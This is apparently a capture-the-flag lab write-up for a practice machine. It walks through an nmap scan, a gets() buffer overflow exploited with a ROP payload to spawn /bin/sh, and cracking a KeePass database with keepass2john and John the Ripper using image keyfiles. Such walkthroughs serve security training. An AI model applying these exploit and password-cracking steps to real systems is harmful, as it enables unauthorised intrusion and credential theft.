User Shell:
using nmap or view source page at 10.10.10.147
u'll find out that there's a 'myapp' service program on 10.10.10.147:1337
> nmap -p- -v -o nmap_verbosity.txt 10.10.10.147

then, download myapp
analized it by IDA.
vuln at get(), the char[112] will be overflow.
and the system call needs rdi(address of string) to trigger
so, the payload looks like this:
> payload = padding.encode() + p64(pop_r13_r14_r15_ret) + p64(in_main_system) + null + null + p64(mov_rsp_to_rdi_jmp13) + bin_sh
can look at myapp_exploit.py to check out details
pop r13 for the mov rdi, rsp in test function.
pop 14, r15 just use null
then ret to system in main.
the rsp is now /bin/sh
mov rdi, rsp
jmp r13
trigger the user shell
using ssh-keygen as IPPSec did to get a better-look shell.

Root Shell:

Download all files at /home/user
keepass2john put key(IMG files) and data(MyPasswords.kdbx) together to make hashes:
> keepass2john -k IMG_0545.JPG MyPasswords.kdbx >> first.txt
> keepass2john -k IMG_0546.JPG MyPasswords.kdbx >> second.txt
> keepass2john -k IMG_0547.JPG MyPasswords.kdbx >> third.txt
> keepass2john -k IMG_0548.JPG MyPasswords.kdbx >> forth.txt
> keepass2john -k IMG_0552.JPG MyPasswords.kdbx >> fiveth.txt
> keepass2john -k IMG_0553.JPG MyPasswords.kdbx >> sixth.txt

Then, brute force via john the ripper, found out that the IMG_0547.JPG is the key we want.
> john --wordlist=/root/rockyou.txt third.txt
